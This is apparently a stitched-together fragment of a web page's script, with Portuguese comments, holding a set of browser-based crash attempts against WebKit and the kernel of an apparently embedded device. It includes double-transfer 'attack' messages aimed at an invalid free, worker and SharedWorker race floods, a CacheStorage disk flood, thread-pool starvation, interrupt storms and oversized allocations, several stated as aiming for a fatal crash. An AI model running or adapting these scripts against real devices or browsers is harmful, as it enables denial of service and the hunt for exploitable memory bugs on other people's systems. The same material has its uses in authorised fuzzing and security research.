        // --- TESTE 6: Kernel Heap Stats Update Race ---
        // Alvo: "[STATS] max allocated size of heap..."
        // Cria flutuação rápida na memória do Kernel para bugar o contador.
        function runStatsRace() {
            log("[KERNEL] Racing Heap Statistics...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca/Liberta recursos do Kernel rapidamente
                    setInterval(() => {
                        const ch = new MessageChannel(); // Aloca
                        // Envia algo para alocar buffer
                        ch.port1.postMessage(new ArrayBuffer(1024));
                        // Fecha para libertar
                        ch.port1.close();
                        ch.port2.close();
                    }, 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Vários workers fazendo isso em paralelo para criar "ruído" nas estatísticas globais
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("go");
            }
            log("20 Workers a agitar o Heap do Kernel.");
        }
// --- TESTE 1: Momentum Scroll Event Logic Error ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta confundir o cálculo de inércia do scroll.
        function runMomentumCrash() {
            log("[WebKit] Iniciando Momentum Crash...");
            const div = document.getElementById('scroll-box');
            
            // Simula um scroll "impossível":
            // Scroll para baixo, depois scroll para cima IMEDIATO, 
            // e muda o overflow para hidden no meio do evento.
            
            let toggle = false;
            const interval = setInterval(() => {
                try {
                    div.scrollTop = toggle ? 5000 : 0;
                    
                    // Dispara evento sintético de roda com delta alto (inércia)
                    div.dispatchEvent(new WheelEvent('wheel', {
                        deltaY: toggle ? 1000 : -1000,
                        deltaMode: 0 // Pixels
                    }));
                    
                    // Race: Muda propriedade de layout durante o evento
                    if (Math.random() > 0.5) {
                        div.style.overflow = 'hidden';
                        div.getBoundingClientRect(); // Força layout
                        div.style.overflow = 'scroll';
                    }
                    
                    toggle = !toggle;
                } catch(e) {}
            }, 5);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Momentum test finalizado.");
            }, 3000);
        }

        // --- TESTE 2: 'FATAL: attempt' Allocator Trigger ---
        // Alvo: "FATAL: attempt..." no JSC Allocator.
        // Tenta alocar um tamanho inválido ou negativo que escapa da verificação inicial JS.
        function runFatalAlloc() {
            log("[WebKit] Tentando trigger Fatal Alloc...");
            
            try {
                // Tenta alocações de borda (Edge Cases)
                // ArrayBuffer máximo seguro é ~2GB-1 no 32bit ou mais no 64bit
                // Tentamos valores que podem causar overflow de inteiro em cálculos internos
                const sizes = [
                    2147483647, // Max Int32
                    2147483648, // Max Int32 + 1
                    4294967295, // Max Uint32
                    Number.MAX_SAFE_INTEGER
                ];
                
                sizes.forEach(s => {
                    try {
                        const ab = new ArrayBuffer(s);
                        log(`Alloc ${s} OK (Inesperado).`);
                    } catch(e) {
                        // RangeError é o esperado. Queremos o FATAL crash.
                    }
                });
                
                // Tenta via WebAssembly (limites diferentes)
                if (window.WebAssembly) {
                    new WebAssembly.Memory({initial: 65536}); // Max Pages (~4GB)
                }
                
                log("Allocator stress concluído.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: System Suspend Logic Stress ---
        // Alvo: "system_suspend_phase2_pre_sync"
        // Simula a entrada em suspensão repetidamente para estressar os hooks do sistema.
        function runVisibilitySuspend() {
            log("[KERNEL] Simulando Suspend/Resume Stress...");
            
            // Usa a Page Visibility API para simular o browser indo para background/suspend
            // Isso dispara eventos de sistema de baixo nível
            
            const interval = setInterval(() => {
                // Infelizmente não podemos forçar 'visibilityState' via JS puro diretamente,
                // mas podemos criar iframes e destruí-los, ou usar requestAnimationFrame
                // de forma intermitente para simular "lags" de suspensão.
                
                // Carga pesada na GPU para simular estado de "jogo rodando"
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                if(gl) {
                    gl.clearColor(Math.random(), 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    // Força sincronização
                    gl.finish(); 
                }
                
                // Tenta enganar o scheduler com delays síncronos
                const start = performance.now();
                while(performance.now() - start < 20); // Bloqueia 20ms (micro-freeze)
                
            }, 50);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Suspend logic stress finalizado.");
            }, 5000);
        }

        // --- TESTE 4: Invalid Free Trigger (Kernel) ---
        // Alvo: "free: address %p has not been allocated"
        // Tenta enganar o Kernel para libertar um endereço inválido ou duplo.
        function runBadFree() {
            log("[KERNEL] Tentando Invalid Free (Double Free)...");
            
            const channel = new MessageChannel();
            const sab = new SharedArrayBuffer(4096);
            
            // O GOLPE: Enviar o MESMO buffer transferível duas vezes na mesma mensagem.
            // O WebKit deve bloquear, mas se passar para o Kernel IPC...
            try {
                // ArrayBuffer normal (transferível)
                const ab = new ArrayBuffer(1024);
                // Tenta transferir o mesmo handle duas vezes
                channel.port1.postMessage("attack", [ab, ab]);
                log("Double Transfer enviado (PERIGO).");
            } catch(e) {
                log("JS bloqueou Double Transfer (Seguro): " + e.message);
            }
            
            // Tenta via SharedWorker (IPC diferente)
            try {
                const w = new SharedWorker(URL.createObjectURL(new Blob([""],{type:"text/js"})));
                const ab2 = new ArrayBuffer(1024);
                w.port.postMessage("attack", [ab2, ab2]);
            } catch(e) {}
        }

        // --- TESTE 5: HMD 'Already Detached' Race ---
        // Alvo: "[HMDDFU_ERR]... already detached"
        // Tenta criar e destruir sessões VR rapidamente.
        function runHMDDetach() {
            log("[KERNEL] Atacando HMD Detach Logic...");
            
            if (!navigator.getVRDisplays) return log("VR API off.");
            
            let count = 0;
            const interval = setInterval(() => {
                // Solicita displays
                navigator.getVRDisplays().then(displays => {
                    if (displays.length > 0) {
                        // Se houver display (mesmo virtual), tenta apresentar e cancelar
                        displays[0].requestPresent([{source: document.createElement('canvas')}])
                            .then(() => {
                                // Cancela imediatamente (Detach race)
                                displays[0].exitPresent();
                            }).catch(()=>{});
                    }
                });
                
                count++;
                if (count > 200) {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }
            }, 20);
        }

        // --- TESTE 6: TLS Deallocation Race ---
        // Alvo: "deallocate_tls_block_from_dtv"
        // Estressa a limpeza de memória local da thread.
        function runTLSDealloc() {
            log("[KERNEL] Iniciando TLS Dealloc Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca muito TLS
                    const x = new Intl.DateTimeFormat();
                    // Suicídio rápido
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria workers em rajadas
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    new Worker(url).postMessage("go");
                }
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("TLS Race finalizada.");
            }, 3000);
        }
// --- TESTE 1: SharedWorkerThreadProxy C++ Race ---
        // Alvo: O proxy C++ que gere a thread do SharedWorker.
        // Tenta destruir a ligação enquanto mensagens pesadas estão em trânsito.
        function runSharedProxyRace() {
            log("[WebKit] Atacando SharedWorkerThreadProxy...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Mantém o proxy ocupado serializando
                    postMessage({data: new Array(10000).fill(1.1)});
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.start();
                sw.port.postMessage("ping");
                
                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
                
                // Força atividade no proxy
                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
                
                i++;
                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
                if(i > 1000) clearInterval(interval);
            }, 10);
        }

        // --- TESTE 2: /system_tmp/ Overflow Trigger ---
        // Alvo: O caminho "/system_tmp/" encontrado no binário.
        // Tenta encher o disco temporário usando CacheStorage e Blobs.
        function runSysTmpFlood() {
            log("[WebKit] Inundando /system_tmp/...");
            
            if (!window.caches) return log("Cache API off.");
            
            // Cria um payload grande (10MB)
            const data = new Response(new ArrayBuffer(10 * 1024 * 1024));
            let count = 0;
            
            caches.open('sys_tmp_killer').then(cache => {
                const interval = setInterval(() => {
                    // Grava ficheiros rapidamente. O sistema deve fazer flush para o disco (/system_tmp/)
                    // quando a RAM encher.
                    cache.put('/file_' + count, data.clone())
                        .catch(e => log("Quota error (Bom): " + e.name));
                    
                    count++;
                    if(count % 10 === 0) log(`Arquivos 10MB escritos: ${count}`);
                    
                    // Não paramos até erro de quota ou crash
                }, 50);
            });
        }

        // --- TESTE 3: WTF::AutomaticThread Starvation ---
        // Alvo: "WTF::AutomaticThread" (Pool de threads internas do WebKit).
        // Tenta ocupar todas as threads auxiliares para impedir tarefas do sistema.
        function runAutoThreadStress() {
            log("[WebKit] Esgotando AutomaticThreads...");
            
            const p = [];
            // ImageBitmap decode usa AutomaticThreads
            const blob = new Blob([""], {type: "image/png"}); 
            
            for(let i=0; i<5000; i++) {
                // Dispara milhares de tarefas em paralelo
                p.push(createImageBitmap(blob).catch(()=>{}));
            }
            
            // Crypto também usa
            if(window.crypto && window.crypto.subtle) {
                for(let i=0; i<1000; i++) {
                    p.push(crypto.subtle.digest("SHA-256", new Uint8Array(100)).catch(()=>{}));
                }
            }
            
            log("5000+ Tarefas de thread agendadas.");
        }

        // --- TESTE 4: int_thread_get Interrupt Storm ---
        // Alvo: "int_thread_get" (Gestão de interrupções).
        // Gera 'soft interrupts' massivos via Timers e PostMessage.
        function runInterruptStorm() {
            log("[KERNEL] Iniciando Interrupt Storm...");
            
            const mc = new MessageChannel();
            mc.port1.onmessage = () => {}; // Drain
            
            // Loop síncrono que dispara eventos assíncronos
            // Isso força o kernel a agendar e despachar interrupções de software
            const workerCode = `
                setInterval(() => {
                    // Timer de alta frequência
                }, 0);
                onmessage = (e) => {
                    e.data.postMessage("irq");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) {
                const w = new Worker(url);
                // Ping-pong furioso
                setInterval(() => w.postMessage(mc.port2, [mc.port2]), 1);
            }
            log("Tempestade de IRQ iniciada.");
        }

        // --- TESTE 5: vm.budgets.mlock_avail Underflow ---
        // Alvo: "vm.budgets.mlock_avail"
        // Tenta confundir o contador de memória disponível alocando e libertando Wasm.
        function runMlockUnderflow() {
            log("[KERNEL] Atacando mlock_avail Counter...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const mems = [];
            let state = 0;
            
            const interval = setInterval(() => {
                try {
                    // Padrão de serra: Aloca muito, liberta tudo, repete
                    // Tenta criar uma condição onde o contador 'avail' dessincroniza
                    if (state === 0) {
                        // Aloca
                        for(let i=0; i<10; i++) {
                            mems.push(new WebAssembly.Memory({initial: 100, shared: true}));
                        }
                        if (mems.length > 200) state = 1;
                    } else {
                        // Liberta (Drop references)
                        mems.length = 0; // Trigger GC
                        state = 0;
                    }
                } catch(e) {
                    // Ignora erros de OOM, queremos o erro de lógica no contador
                }
            }, 10);
            
            // Força GC periódico para efetivar a libertação no Kernel
            setInterval(() => {
                const trash = new ArrayBuffer(10 * 1024 * 1024);
            }, 1000);
            
            log("Mlock Fluctuation ativa.");
        }

        // --- TESTE 6: thr_init.c Allocation Failure ---
        // Alvo: "Can't allocate initial thread" (thr_init.c)
        // Tenta falhar a inicialização da thread no nível mais baixo.
        function runInitThreadFail() {
            log("[KERNEL] Forçando falha em thr_init...");
            
            const workerCode = `postMessage('ok');`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Spam de criação de Workers.
            // Diferente de outros testes, aqui queremos falhar a *criação* da estrutura, não o uso.
            let count = 0;
            function spam() {
                for(let i=0; i<50; i++) {
                    new Worker(url).terminate(); // Cria e mata instantaneamente
                }
                count += 50;
                if(count % 1000 === 0) log(`Tentativas init: ${count}`);
                if(count < 50000) setTimeout(spam, 0);
                else log("Fim do teste Init.");
            }
            spam();
        }



    </script>
</body>
</html>
